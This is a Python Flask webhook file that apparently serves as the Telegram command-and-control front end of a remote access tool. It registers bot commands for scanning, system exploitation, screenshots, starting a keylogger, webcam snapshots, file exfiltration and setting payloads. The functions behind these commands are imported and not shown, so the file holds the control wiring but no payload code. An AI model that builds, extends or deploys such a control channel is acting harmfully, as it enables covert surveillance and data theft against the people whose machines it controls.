# telegram/webhook.py

import os
import traceback
import asyncio
from flask import Blueprint, request, Response
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler

from modules.utils import get_api_keys
from telegram_bot.telegram_bot import (
    menu, osint, scan, exploit_sys,
    screenshot, keylogger_start,
    webcam_snap, exfiltrate, exfiltrate_path,
    rapport, set_payload
)

# 🔐 Clés API Telegram
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")

# ✅ Application Telegram persistante
app = ApplicationBuilder().token(TOKEN).build()

# ✅ Ajout des handlers une seule fois
app.add_handler(CommandHandler("menu", menu))
app.add_handler(CommandHandler("osint", osint))
app.add_handler(CommandHandler("scan", scan))
app.add_handler(CommandHandler("exploit_sys", exploit_sys))
app.add_handler(CommandHandler("screenshot", screenshot))
app.add_handler(CommandHandler("keylogger_start", keylogger_start))
app.add_handler(CommandHandler("webcam_snap", webcam_snap))
app.add_handler(CommandHandler("exfiltrate", exfiltrate))
app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
app.add_handler(CommandHandler("rapport", rapport))
app.add_handler(CommandHandler("set_payload", set_payload))

# ✅ Blueprint Flask
telegram_webhook = Blueprint("telegram_webhook", __name__)

@telegram_webhook.route("/telegram/webhook", methods=["POST"])
def handle_webhook():
    try:
        if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
            return Response("Unauthorized", status=403)

        update_data = request.get_json(force=True)
        update = Update.de_json(update_data, bot=app.bot)

        async def process():
            await app.process_update(update)

        asyncio.run(process())
        return Response("OK", status=200)

    except Exception as e:
        print("❌ Erreur Webhook :", e)
        traceback.print_exc()
        return Response("Erreur serveur", status=500)
